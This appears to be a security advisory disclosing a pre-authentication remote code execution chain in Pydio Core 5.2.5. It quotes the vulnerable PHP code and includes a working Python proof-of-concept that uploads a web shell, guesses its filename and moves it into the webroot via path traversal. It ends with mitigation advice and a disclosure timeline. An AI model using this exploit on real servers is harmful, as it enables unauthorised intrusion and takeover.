# Preauth RCE in Pydio Core 5.2.5

[Pydio Core](https://github.com/pydio/pydio-core) is an open-source platform for
managing, sharing and synchronising files within a self-hosted environment. In
addition to the core file sharing functionality, it provides plugins for
alternative storage backends and authentication drivers.

This article discloses a previously undocumented preauthentication RCE in Pydio
Core 5.2.5. The application itself is quite old, so the impact here isn't
particularly groundbreaking. The goal of this writeup is mainly to ensure the
vulnerability can be found by search engines and other indexers.

#### Preconditions and Fingerprinting

Unlike [CVE-2018-20718](https://nvd.nist.gov/vuln/detail/CVE-2018-20718), this vulnerability does 
not require that the attacker have prior knowledge of a 
public share link. Instead, the only precondition is that the Pydio
instance is configured to use the file-backed serial configuration driver, as
opposed to the database-backed driver.

The use of this driver
fingerprinted by making a GET request to `/index.php?action=get_xml_registry`
and searching for the following element in the application response:
```xml
<confdriver name="serial" id="conf.serial" label="Serialized Files"
  description="Stores the conf data as serialized PHP values on the filesystem.">
```

#### Description

Exploitation of this vulnerability involves chaining three primitives in order
to achieve an arbitrary write into the application's file system.

#### Primitive 1: Preauthentication file read from `/tmp`

Within `class.AbstractConfDriver.php` the `get_binary_param` and
`get_global_binary_param` actions allow unauthenticated users to read data from
a local file by passing a filename in the `tmp_file` parameter. Since the path
is sanitised by `AJXP_Utils::securePath`, the read is constrained only to files
in the `/tmp` directory.

```php
case "get_binary_param" :
  if (isSet($httpVars["tmp_file"])) {
    $file = AJXP_Utils::getAjxpTmpDir()."/".AJXP_Utils::securePath($httpVars["tmp_file"]);
    if (isSet($file)) {
      header("Content-Type:image/png");
      readfile($file);
    }
  } else if (isSet($httpVars["binary_id"])) {
    ⋮
  }
  break;
```

#### Primitive 2: Preauthentication file write into `/tmp` with constrained filename

Also within `class.AbstractConfDriver.php`, the `store_binary_temp` action
allows unauthenticated users to upload arbitrary files into the `/tmp`
directory. Although the extension of the upload is not modified, the filename of
the upload is prefixed by six characters from an MD5 hash of the upload time.
Since PHP resolves time at a second resolution, this does not provide enough
entropy to prevent attackers from brute forcing the filename using the arbitrary
read primitive above.

```php
case "store_binary_temp" :
  if (count($fileVars)) {
    $keys = array_keys($fileVars);
    $boxData = $fileVars[$keys[0]];
    $err = AJXP_Utils::parseFileDataErrors($boxData);
    if ($err != null) {

    } else {
      $rand = substr(md5(time()), 0, 6);
      $tmp = $rand."-". $boxData["name"];
      @move_uploaded_file($boxData["tmp_name"], AJXP_Utils::getAjxpTmpDir()."/". $tmp);
    }
  }
```

#### Primitive 3: Arbitrary local file move

Within `class.AJXP_Utils.php`, the `parseStandardFormParameters` function parses
and coalesces multiple HTTP request formats into a common structure. As a
side-effect of this parsing, when the datatype of a paramter is specified as
`binary`, `parseStandardFormParameters` calls `saveBinary` in order to persist
the specified temporary file in the application's binary store.

```php
⋮
else if ($type == "binary" && $binariesContext !== null) {
  if (!empty($value)) {
    ⋮
    } else {
      $file = AJXP_Utils::getAjxpTmpDir()."/".$value;
      if (file_exists($file)) {
        $id= !empty($repDef[$key."_original_binary"]) ? $repDef[$key."_original_binary"] : null;
        $id=ConfService::getConfStorageImpl()->saveBinary($binariesContext, $file, $id);
        $value = $id;
      }
    }
}
```

Since neither `$file` nor `$id` are sanitised against path traversal, this
enables unauthenticated attackers to move files to and from arbitrary locations
within the application's filesystem. By moving a webshell into a location under
the application's webroot, we can then achieve code execution.

#### Proof of Concept

Below is a proof-of-concept script for exploiting the remote code execution
vulnerability in Pydio Core. 

`shell.php` can be any PHP web shell or reverse shell. For example, one may use
the [`pentestmonkey` reverse
shell](https://github.com/pentestmonkey/php-reverse-shell).

```py
#!/usr/bin/env python3

import requests
from time import time
from hashlib import md5
import base64
import os
import urllib3

host = ...

def main():
    server_name = local_name = "shell.php"

    # store the file in /tmp
    timestamp = int(time())
    r = requests.post(
        f"{host}/index.php?action=store_binary_temp",
        files={"file": (server_name, open(local_name, "rb"), "application/text")},
    )

    # brute force the time hash to find the filename
    prefix = None
    for stamp in range(timestamp - 5, timestamp + 5):
        prefix = md5(str(stamp).encode()).hexdigest()[:6]
        r = requests.get(
            f"{host}/index.php?action=get_binary_param",
            params={"tmp_file": f"{prefix}-{server_name}"},
        )
        if "No such file or directory" not in r.text:
            print("found", prefix)
            break

    # move the file into a public location
    data = {
        "PREFERENCES_foo": f"{prefix}-{server_name}",
        "PREFERENCES_foo_ajxptype": "binary",
        "PREFERENCES_foo_original_binary": f"../../../../../public/{local_name}",
    }
    r = requests.post(
        f"{host}/index.php?action=custom_data_edit",
        data=data,
    )

    requests.get(
        f"{host}/data/plugins/conf.serial/binaries/users/shared/shell.php",
    )

if __name__ == "__main__":
    main()

```

#### Mitigations

Pydio Core reached end of life on December 31st, 2019, and is no longer
maintained or supported. Its successor, Pydio Cells, is a complete rewrite in Go
that introduces a modern microservice-based architecture designed for better
scalability, reliability, and integration with contemporary infrastructure.
Migration is recommended mitigate this vulnerability as well as to benefit from
active development, security updates, and new capabilities.

#### Timeline

- 23 July 2025: Initial disclosure to Pydio
- 28 July 2025: Permission to publish granted
